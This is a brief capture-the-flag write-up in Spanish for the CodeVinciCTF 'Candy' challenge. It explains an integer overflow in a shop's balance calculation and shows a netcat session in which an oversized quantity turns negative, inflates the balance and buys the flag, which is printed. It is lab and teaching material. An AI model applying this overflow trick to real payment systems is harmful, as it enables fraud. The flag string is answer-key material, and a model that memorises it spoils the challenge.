# Candy

Este era un integer overflow, cuando compras un objeto hace el calculo nuevo_saldo = tu_saldo - precio * cantidad

Si tu introduces una cantidad muy grande la variable se queda en negativo y queda nuevo_saldo = tu_saldo - (-resultado) = tu_saldo + (precio * cantidad)

Escogiendo un numero mas grande que INT_MAX (2147483647) se trunca:

```
nc codevincictf.itis.pr.it 9961

Welcome to the candy shop! Your current balance is: 10.00€
1. Pop Candy - 2.50€
   A pop candy that cracks in your mouth.
2. Pop Candy - 2.50€
   A pop candy that cracks in your mouth.
3. Mint Candy - 1.20€
   A fresh mint candy for a cool breath.
4. Flag - 100.00€
   Special CodeVinci's Flag

Choose an item (1-4) or 0 to exit: 1

You selected: Pop Candy
Description: A pop candy that cracks in your mouth.
Price: 2.50€
How many would you like: 214748364700
Quantity cannot be negative.
How many would you like: 2147483647000
You chose -1000 of Pop Candy. Your balance is now 2510.00€

Welcome to the candy shop! Your current balance is: 2510.00€
1. Pop Candy - 2.50€
   A pop candy that cracks in your mouth.
2. Pop Candy - 2.50€
   A pop candy that cracks in your mouth.
3. Mint Candy - 1.20€
   A fresh mint candy for a cool breath.
4. Flag - 100.00€
   Special CodeVinci's Flag

Choose an item (1-4) or 0 to exit: 4

You selected: Flag
Description: Special CodeVinci's Flag
Price: 100.00€
Congratz: CodeVinciCTF{U_br0k3_mY_5h0p_d2qx7}
```

`CodeVinciCTF{U_br0k3_mY_5h0p_d2qx7}`

